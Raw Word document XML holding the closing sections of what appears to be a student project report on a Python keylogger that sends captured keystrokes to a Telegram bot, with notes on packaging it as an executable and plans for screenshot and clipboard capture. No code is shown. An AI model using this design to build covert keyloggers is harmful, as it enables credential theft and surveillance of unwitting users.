          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Implemented a safe exit mechanism with the keyword </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5853FFA0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Showed how to convert the Python script into a standalone executable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298291A4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>This work also reinforced the ethical considerations around monitoring software. In controlled environments, such tools can aid digital forensics, productivity studies, and cybersecurity training.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111A055E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="798F4A07">
          <v:rect id="_x0000_i1503" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4C90E3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>6.2 Advantages Over Traditional Email-Based Systems</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5F0E9C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Instant Delivery:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Telegram API provides faster, real-time messaging compared to email queues.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC04EB7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Ease of Setup:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> No SMTP server or app password required; only a bot token and chat ID.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B98865D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Platform Agnostic:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Works on both Windows and Linux with minimal setup.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05678D5B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Low Maintenance:</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Telegram bot runs indefinitely without additional server-side configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A6A14A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="0917F438">
          <v:rect id="_x0000_i1504" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="43868DCB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>6.3 Future Scope</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFA6C9B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Add screenshots and clipboard monitoring.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71253133" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Multi-user and multi-chat support.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADD68E4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>End-to-end encryption of local log files before transmission.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0DB3F1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>A dashboard to visualize captured data over time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BCF879" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Remote start/stop via Telegram commands.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6794FE37" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="7700BD9D">
          <v:rect id="_x0000_i1505" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E97007" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>6.4 References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7B9388" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="67"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Python Official Documentation – </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:tgtFrame="_new" w:history="1">
        <w:r w:rsidRPr="00497ED2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>https://docs.python.org/3/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7ED7C42F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="67"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Documentation – </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:tgtFrame="_new" w:history="1">
        <w:r w:rsidRPr="00497ED2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>https://pynput.readthedocs.io/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="368E41FA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="67"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Requests Library – </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:tgtFrame="_new" w:history="1">
        <w:r w:rsidRPr="00497ED2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>https://docs.python-requests.org/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A85D3E3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="67"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Telegram Bot API – </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:tgtFrame="_new" w:history="1">
        <w:r w:rsidRPr="00497ED2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>https://core.telegram.org/bots/api</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B1E6A8E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="67"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>PyInstaller</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:tgtFrame="_new" w:history="1">
        <w:r w:rsidRPr="00497ED2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>https://pyinstaller.org/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67C90111" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00497ED2" w:rsidRPr="00497E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11CA3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C3A2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36232"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CC8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4212B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7204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1D2C0E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="83C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42472"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C23C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0450C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5F14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D5F4C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7EC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E7BE6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F5C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66037"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C23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44B4D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2114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D1B8A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="842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A54C2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CCAC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1E0E24"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7A00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4C6005"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D37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D41D2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BEC63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2F2BCB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="94C6D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3753F3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BB6A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71778"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="058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26A49"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5B5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60335"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="53A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8747C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1212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AD28B0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2DF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57CA1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FAA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84B41"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8B9E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5D25"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="366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64F4A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="371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F35D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4D72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C533E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="842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B91110"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="74F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A2FF7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AF4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80D6A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="895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73212"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4FA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093702"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3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3227A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C86C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05944"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9C4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404905"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="20C0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66267"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="84D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C12E6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="893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66ABB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="886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859A7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3152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6B2BA0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9422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122241"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7B8E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FB7FB6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7AA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E0180"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8D3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417744"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="62F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132BF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F780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757F29"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="39F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64F51"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="47D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9D68A2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B96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C71B37"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6E9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01C37"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4AC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4632B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="44A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F7EF3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F9F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7767F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="55D8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97CE2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5BA4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625889"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A4A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503FDA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7B4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9853DB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="79A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2A37A2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0720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242213">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="239565434">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1658342177">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1270042629">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="260182387">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="213546464">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="139344339">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1967395667">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="837773667">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="2092698973">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="2131167448">
    <w:abstractNumId w:val="55"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="181823465">
    <w:abstractNumId w:val="64"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="2090342632">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="127937372">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1330325880">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1748961936">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="649603625">
    <w:abstractNumId w:val="58"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1843011679">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="406920498">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="714816574">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="533738151">
    <w:abstractNumId w:val="52"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="570585244">
    <w:abstractNumId w:val="53"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="1571966427">
    <w:abstractNumId w:val="62"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="579292672">
    <w:abstractNumId w:val="56"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="1188907034">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="2019306767">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="1836722363">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="1578054758">
    <w:abstractNumId w:val="45"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="579290701">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="649747825">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="996231588">
    <w:abstractNumId w:val="66"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="1752584312">
    <w:abstractNumId w:val="48"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="1572421365">
    <w:abstractNumId w:val="50"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="681009412">
    <w:abstractNumId w:val="51"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="405538143">
    <w:abstractNumId w:val="43"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="221868823">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="2070030705">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="1021661198">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="1893423586">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="1992830569">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="1294798535">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="1519125607">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="2077778258">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="44" w16cid:durableId="1875343887">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="45" w16cid:durableId="1898079754">
    <w:abstractNumId w:val="63"/>
  </w:num>
  <w:num w:numId="46" w16cid:durableId="919214645">
    <w:abstractNumId w:val="54"/>
  </w:num>
  <w:num w:numId="47" w16cid:durableId="2096511606">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="48" w16cid:durableId="1380544087">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="49" w16cid:durableId="1487167868">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="50" w16cid:durableId="921328335">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="51" w16cid:durableId="865562270">
    <w:abstractNumId w:val="65"/>
  </w:num>
  <w:num w:numId="52" w16cid:durableId="537813872">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="53" w16cid:durableId="848255478">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="54" w16cid:durableId="730420151">
    <w:abstractNumId w:val="67"/>
  </w:num>
  <w:num w:numId="55" w16cid:durableId="1450200149">
    <w:abstractNumId w:val="60"/>
  </w:num>
  <w:num w:numId="56" w16cid:durableId="441416929">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="57" w16cid:durableId="777414470">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="58" w16cid:durableId="746654080">
    <w:abstractNumId w:val="46"/>
  </w:num>
  <w:num w:numId="59" w16cid:durableId="240602899">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="60" w16cid:durableId="25257744">
    <w:abstractNumId w:val="47"/>
  </w:num>
  <w:num w:numId="61" w16cid:durableId="1424838240">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="62" w16cid:durableId="1873956651">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="63" w16cid:durableId="137723617">
    <w:abstractNumId w:val="61"/>
  </w:num>
  <w:num w:numId="64" w16cid:durableId="728113433">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="65" w16cid:durableId="644050917">
    <w:abstractNumId w:val="57"/>
  </w:num>
  <w:num w:numId="66" w16cid:durableId="238948283">
    <w:abstractNumId w:val="59"/>
  </w:num>
  <w:num w:numId="67" w16cid:durableId="1984692922">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="68" w16cid:durableId="187977911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76E"/>
    <w:rsid w:val="00497ED2"/>
    <w:rsid w:val="00685F9D"/>
    <w:rsid w:val="007252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8E579"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{FD6282E0-E7B8-4D78-8AAF-DADE1B72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7ED2"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
